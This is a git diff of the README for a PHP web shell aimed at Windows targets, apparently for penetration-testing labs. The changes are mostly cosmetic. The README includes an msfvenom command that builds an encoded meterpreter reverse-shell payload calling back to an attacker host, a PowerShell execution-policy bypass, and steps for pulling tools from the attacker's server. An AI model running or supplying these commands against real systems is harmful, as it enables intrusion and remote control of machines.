@@ -1,5 +1,6 @@
+[![Actively Maintained](https://img.shields.io/badge/Maintenance%20Level-Actively%20Maintained-green.svg)](https://gist.github.com/cheerfulstoic/d107229326a01ff0f333a1d3476e068d)
 # The Not-So Simple PHP Command Shell
-![](/img/nsscmdshell.png)
+![Logo](/img/nsscmdshell.png)
 ## Foreword:
 > Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. The following websites provide training resources and practice scenarios and are excellent resources for learning such skills:
 
@@ -10,7 +11,7 @@ Automates or simplifies many on target functions. Designed for windows targets. 
 
 venom.exe : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
 
-![](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)
+![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)
 
 ## Automates or simplifies many on target enumeration functions. Including:
 
@@ -34,9 +35,9 @@ Now get "nsscmdshell.php" onto the target < - DISCLAIMER (in a manner consistent
 
 Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.
 
-![](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png)
+![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png)
 
-#### * The upload and download options are self explanatory, but just to avoid any confusion:
+###### The upload and download options are self explanatory, but just to avoid any confusion:
 
 If using the select field, choose your file and click "upload". Files linked in the select field options need to be present at the web root at the ip address and port in lines 10 and 11 of nsscmdshell.php.<sup>1</sup>
 
@@ -46,15 +47,15 @@ For the download option, simply enter the filename to be downloaded from the wor
 
 Example usage: run jaws-enum.ps1 - output to jaws.txt `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt`, then download the output file to your attack machine for later close examination.
 
-![](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png)
+![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png)
 
 The quick command buttons each have a title attribute with a brief description of the function - hover over the button to see the description.<br>
 
-![](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-title-desc.png)
+![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-title-desc.png)
 
 It goes without saying that the effectiveness of the various functions depends on the target os's support of the functions and the current user's permissions. This was designed for and tested on Windows XP - Windows 8.1 with very limited testing on Win10.
 
-*** Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connection could be made...." error?
+*** Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connetion could be made...." error?
  Two possible causes:
 1. You didn't set the variables, `$attackip` and `$attackport` to your machine. Fix: ifconfig your ip, and set in nsscmdshell.php lines 10 and 11.
 2. The files are not available on the defined server or port, or there is no server running on the defined port. Fix: `python3 -m http.server XXXX` in a directory containing the files you're attempting to upload.
@@ -63,6 +64,5 @@ It goes without saying that the effectiveness of the various functions depends o
 <sup>1</sup> I generally cd into my "windowstools" folder and start a simple http server:
 `cd windowstools`
 `python3 -m http.server 8000`.
-
-![](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png)
+![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png)
 ![Hack The Box](http://www.hackthebox.eu/badge/image/476578)
